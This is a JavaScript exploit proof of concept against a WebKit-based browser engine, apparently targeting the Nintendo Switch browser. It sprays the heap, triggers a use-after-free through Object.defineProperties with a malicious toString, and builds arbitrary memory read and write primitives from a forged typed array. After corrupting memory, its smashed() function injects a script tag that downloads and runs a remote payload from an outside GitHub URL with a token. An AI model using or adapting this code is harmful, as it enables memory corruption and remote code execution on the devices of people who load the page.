// Based on https://jbme.qwertyoruiop.com/
// and lookout PoC code.
var bufs = new Array(1000);
//


var trycatch = "";
for(var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
var fc = new Function(trycatch);
var fcp = 0;
var smsh = new Uint32Array(0x10)

// Trying to stop GC
function keep(x) {
	setTimeout(function() { alert("shit" + x) }, 10*60*1000);
}


var mem0 = 0;
var mem1 = 0;
var mem2 = 0;

function read4(addr) {
	mem0[4] = addr;
	var ret = mem2[0];
	mem0[4] = mem1;
	return ret;
}

function write4(addr, val) {
	mem0[4] = addr;
	mem2[0] = val;
	mem0[4] = mem1;
}

function sleep(milliseconds) {
	var start = new Date().getTime();
	for(var i = 0; i < 1e7; i++) {
		if((new Date().getTime() - start) > milliseconds) {
			break;
		}
	}
}
// This u2d code seems to be taken from a PoC for PSA-2013-0903.
// wraps two uint32s into double precision
_dview = null;

function u2d(low, hi) {
	if(!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setUint32(0, hi);
	_dview.setUint32(4, low);
	return _dview.getFloat64(0);
}
// unwraps uints from double 
function d2u(d) {
	if(!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setFloat64(0, d);
	return {
		low: _dview.getUint32(4),
		hi: _dview.getUint32(0)
	};
}

// dgc attempts to trigger a garbage collection by allocating a large amount of memory
var pressure = new Array(100);
dgc = function() {
	for(var i = 0; i < pressure.length; i++) {
		pressure[i] = new Uint32Array(0x10000);
	}
	for(var i = 0; i < pressure.length; i++) {
		pressure[i] = 0;
	}
}

// I dont know why hes doing this.

for(var i = 0; i < 0x1000; i++) {
	var a = new Uint32Array(1);
	a[i.toString(16)] = 1337;
}



function allocbufptrs() {
	if(bufs[0]) return;
	
	// GC!!
	for(var i=0; i < 15; i++){dgc()}

	
	// Create 0x200 FFFF:0000:4141:4141 integer objects
	for(i = 0; i < bufs.length; i++) {
		bufs[i] = new Uint32Array(0x100 * 2)
		for(k = 0; k < bufs[i].length;) {
			bufs[i][k++] = 0x41414141;
			bufs[i][k++] = 0xffff0000;
		}
	}
}

function smashed(stl) {
  alert("Loading payload");
  var x = document.createElement('script');
  x.src = 'https://raw.githubusercontent.com/slimsag/switchpoc/master/payload.js?token=AIMi8uOhXiZKZj_G3GIby3vXtv0ultOiks5Yz0qNwA%3D%3D&cb=' + math.random();
  document.getElementsByTagName("head")[0].appendChild(x);
	return 0;
}



function go_() {
	if(smsh.length != 0x10) {
		smashed();
		return;
	}
	dgc();
	var arr = new Array(0x100);
	
	//arr[0] = 0x1;
	
	var yolo = new ArrayBuffer(0x1000);
	arr[0] = yolo;
	arr[1] = 0x13371337;
	
	var not_number = {};
	not_number.toString = function() {
		arr = null;
		props["stale"]["value"] = null;
		allocbufptrs();
		return 10;
	};
	var props = {
		p0: {value: 0},
		p1: {value: 1},
		p2: {value: 2},
		p3: {value: 3},
		p4: {value: 4},
		p5: {value: 5},
		p6: {value: 6},
		p7: {value: 7},
		p8: {value: 8},
		length: {value: not_number},
		stale: {value: arr},
		after: {value: 666}
	};
	
	var target = [];
	var before_len = arr.length;
	Object.defineProperties(target, props);
	var stale = target.stale;

	if((before_len != stale.length) && (stale[0] == 0x41414141)){
		//alert("Exploit Worked");
		keep(arr);
	} else {
		document.location.reload();
		return;
	}
	
	if(document != document){
		for(var i = 0; i < 5; i++){
			var x=0;
		}
		var fp = {};
		var f1 = 0;
		var x = [];
	}

	stale[0] += 0x101;

	for(i = 0; i < bufs.length; i++) {
		for(k = 0; k < bufs[0].length; k++) {
			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
			// If this is true then stale[0] points to the same thing as bufs[i][k]
			if(bufs[i][k] == 0x41414242) {
				// Create fakeobj for fixing butterfly
				var fakeobj = {};
				
				stale[0] = fakeobj;
				var fop = bufs[i][k];
				
				stale[0] = {
					'a': u2d(105, 0x1172600), // the JSObject properties
					'b': u2d(0, 0), // Butterfly ptr
					'c': smsh, // var smsh = new Uint32Array(0x10)
					'd': u2d(0x100, 0)
				}
			
				stale[1] = stale[0];
				bufs[i][k] += 0x10;
				
				/*
				Array internals:
					void* JSCell
					void* m_vector;
					void* butterflyptr
					uint32_t m_length;
					TypedArrayMode m_mode;
					
					stale[0][0] == first32(JSCell)
					stale[0][1] == second32(JSCell)
					stale[0][2] == first32(m_Vector)
					stale[0][3] == second32(m_Vector)
					stale[0][4] == first32(butterflyptr)
					stale[0][5] == second32(butterflyptr)
					stale[0][6] == m_length
				*/
				stale[0][6] = 0xffffffff; // Overide m_length field

				bck = stale[0][4];
				stale[0][4] = 0; // address, low 32 bits
				mem0 = stale[0];
 				mem1 = bck;
 				mem2 = smsh;
 				bufs.push(stale)
				
				write4((bufs[i][k] - 0x10), read4(fop)); 
				write4((bufs[i][k] - 0x10) + 4, read4(fop + 4));
				fakeobj['a'] = 1;
				write4(bufs[i][k] + 0x08, 0);
				write4(bufs[i][k] + 0x0C, 0);
				
 				if (smsh.length != 0x10) {
 					smashed(stale[0]);
 				}
				alert("3");
				//alert("4");
				
				// Uncommenting this block comment breaks everything.
				/*
				
 				
 				// stale[0][5] = 1; // address, high 32 bits == 0x100000000
 				

				*/
				return;
			}
		}
	}
	setTimeout(function() {
		document.location.reload();
	}, 500);
}

function go() {
	dgc();
	dgc();
	dgc();
	dgc();
	dgc();
	dgc();
	setTimeout(go_, 400);
}
go();
